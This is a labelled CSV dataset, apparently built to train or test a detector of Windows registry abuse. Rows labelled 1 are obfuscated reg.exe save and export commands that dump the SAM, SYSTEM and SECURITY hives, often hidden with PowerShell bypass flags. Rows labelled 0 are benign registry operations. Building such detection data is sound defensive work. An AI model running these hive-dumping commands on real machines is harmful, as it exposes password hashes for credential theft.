text,label
"reg.exe   save   ""hkey_current_user\software\microsoft\windows\currentversion\subkey56""   ""c:\temp\user_settings.reg""",0
"reg compare ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey22"" ""hkey_local_machine\environment_916""",0
"cMd /C poWERSHell -c ""rEG.EXe  save hKeY_local_mAchIne\SySTEm   C:\WINdowS\tEMp\saM.SAve /Y""",1
"reg.exe delete ""hkcu\software\classes\subkey56"" /v path",0
pOweRshell -ExEC bYpass -W HiddEN -c rEg.eXE  exPorT   hKlm\seCURITY   c:\usERS\PuBlic\regiStrY_EXPOrT.ReG,1
"StArt /B rEg.Exe cOMPare ""hkEY_CurreNt_usER\soFtwarE\GOOGLE\chROME\SUbkEy65"" ""HKEY_CuRreNt_USER\SOftwaRE\MYaPp\SEttinGS_104""",0
pOWERSheLL -commANd reG ExPORT Hkey_LoCAl_MAchINE\systEM   \\LOCALHoSt\c$\__dUMP\SaM.BAK /y,1
"PoWersHelL -C reg   coMPARe   ""hkey_UsErs\SOftwArE\gooGlE\CHrOme""   ""HKEy_uSErs\soFTWAre\polIcIeS\mycoRP_237""",0
"Reg SAvE ""HkEy_lOcal_machIne\sOFtWaRE\MYAPP\seTtiNGs\SUBkEY20"" ""%tEMp%\non_SENsItIvE.hive"" /Y",0
"ReG COMpaRE ""HkEY_uSeRS\sOFtwARe\CLASSes"" ""hKey_UserS\sySteM\cuRreNtcoNtrOLseT\SeRVIcEs_738""",0
cMd.Exe /C sTaRt /B rEG ExpOrt hkLm\sECuRITY  C:\tEmP\SYsteM.HiVE /Y,1
"ReG SAVE ""HkEy_uSErS\hkEy_loCAL_maCHIne\sOftWArE\wOW6432nODE"" ""C:\TeMp\USer_SETTINGS.reG"" /y",0
cmd.exE /C START /b reG.eXE  EXpoRT  HKLm\sECURitY   c:\UsErs\PUbLIC\REGiStrY_exporT.REG,1
"staRt /b Reg   qUERY   ""HKu\sOFtWare\PoLICieS\MycOrP\SUBKey42""",0
"reg  dEletE  ""hkCU\softWArE\PoLicIES\MYCorP\SUbKeY81""  /v VeRSiON",0
cMD.ExE /C rEg   sAVe   HkeY_loCAl_mAcHine\SysTem \.\C$aCkup.REg /Y,1
"ReG.EXe DeLeTe ""HKu\SOFtwAre\mIcROsoft\WINDoWs\cuRreNTversION\SuBKeY80""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey89""   ""c:\temp\user_settings.reg""   /y",0
"reg   delete   ""hkcu\software\myapp\settings""   /v lastupdate",0
"reg   copy   ""hku\software\classes\subkey32""   ""hku\software\microsoft\windows\currentversion_427""",0
"sTart /b reg  SaVe  ""hkEY_LOcAL_mAChiNE\hKEY_LOCAl_MacHInE\SoftWARe\WoW6432nodE\sUbkey74""  ""d:\baCKUp\rEGisTRY_hiVe.dat""  /y",0
pwsh -noprofile -c reg save hkey_local_machine\security  c:\temp\system.hive,1
REg.EXe SAVE   hKEY_LoCaL_mAcHiNe\sYstem   %tEmp%\SeC_backUp.dAt,1
"reg   unload   ""hkey_current_user\software\microsoft\windows\currentversion""",0
reg   export   hkey_local_machine\system   %temp%\sec_backup.dat /y,1
"reg  compare  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\software\google\chrome_389""",0
cMD.ExE /c REg.EXe savE   Hkey_lOCAl_MaChiNe\seCuRIty  %TEMP%\sEC_bACKUp.daT,1
"REg.EXe  reSTOrE  ""hkEy_LOCal_mACHine\sYstEm\cuRRENTcONTroLSET\SeRvICES\SUbkEy68""  ""HKey_LoCAL_macHINE\envIronMeNt_251""",0
"ReG.EXe  SavE  ""HKU\SoFTwaRe\MYapP\setTINGS\subKEY47""  ""C:\WinDoWS\Temp\SoftWARe_duMP.dAT""",0
"reg.EXE   DeLETE   ""hkEY_CUrRENT_usER\SoFtWARE\POliCiES\mycoRP\SuBKeY18""   /F",0
"cMd /C pOWeRShelL -C ""REg.EXE   ExPoRt hKlm\seCUrItY  C:\TEmP\sYstEm.HiVe  /y""",1
powERSHelL -commAnD REg  exporT HKeY_lOcal_machINe\systEm   %TEmP%\Sec_BACkuP.dat /y,1
Reg.EXe   ExPORT  HkeY_LoCAl_machine\SECuriTy   c:\UsERs\PUBliC\reGiSTRy_eXPoRt.ReG,1
poWerSHeLl -cOMMANd REG.EXe  exPORT  hKlm\sAm   %TeMp%\SEC_BacKUp.dAt /Y,1
rEG saVE  hKeY_locAL_MacHInE\Sam   \.\C$AckUP.rEg,1
"reg.eXE  QueRy  ""hkeY_uSeRs\SYSTEm\cuRRENTCoNtroLset\sErViceS\SuBKeY55""  /f",0
"cmd /c reg  unload  ""hkey_users\control panel\desktop\subkey48""  /v version",0
reg.exe export   hklm\system  c:\windows\temp\sam.save   /y,1
CmD.EXE /c REg EXPorT  HKlm\SecuRItY \.\c$AcKUp.reG,1
"starT /B reg unLoaD ""Hku\sOFTWarE\mIcROSOfT\WINdOWs\CurrEnTVERsIOn\sUbKey54"" /v PATH",0
"start /b reg  delete  ""hku\software\microsoft\windows\currentversion\subkey47""",0
c:\windows\system32\cmd.exe /k reg   save  hkey_local_machine\system  \.\c$ackup.reg /y,1
pOWeRsHelL -EXEC bypAsS -w HiDdeN -C REG SAVE  hklM\SECURIty  c:\wINDOwS\TemP\sam.sAVE /y,1
CMD.EXE /c STart /B ReG.ExE  sAVE HkLm\Sam  %tEMp%\sEc_BackUP.dAT  /y,1
"ReG   AdD   ""hkey_useRS\SoftwaRE\GOogle\ChROMe\subKeY68""   /v Path   /t rEG_SZ   /D 1",0
"reg.exe   query   ""hkey_current_user\software\microsoft\windows\currentversion""",0
"reg.exe add ""hkey_local_machine\environment"" /f /t reg_sz",0
"cmd /C reg.Exe   sAvE   ""HkEY_lOCal_macHine\HkEY_loCAl_mAcHiNe\SOFTWARe\pOLiciEs\MICroSoft""   ""c:\WIndowS\tEmP\sOFTWAre_dUmp.DaT""   /y",0
c:\WinDOWs\sYsTEm32\CMd.eXE /k REG.exe   eXpOrt HKlM\sAM \.\c$AckUp.rEg  /Y,1
cmd.exe /c reg.exe save  hkey_local_machine\sam   c:\windows\temp\sam.save,1
powershell -command reg   save   hkey_local_machine\system %temp%\sec_backup.dat,1
"powershell -c reg.exe  add  ""hku\software\myapp\settings\subkey79""  /v lastupdate  /t reg_sz  /d ""c:\program files\app""",0
"rEG  Compare  ""HKcU\SoftWaRE\miCrOSOFt\wInDowS\cuRrENTvERsIon""  ""hkcU\sofTWaRE\mIcRoSOfT\winDowS\cuRReNtversIon_825""",0
pwsh -noprofile -c reg.exe   export  hklm\security   c:\windows\temp\sam.save,1
"reg.exe copy ""hkey_local_machine\software\classes"" ""hkey_local_machine\control panel\desktop_144""",0
c:\windows\system32\cmd.exe /k reg.exe save   hkey_local_machine\security   %temp%\sec_backup.dat,1
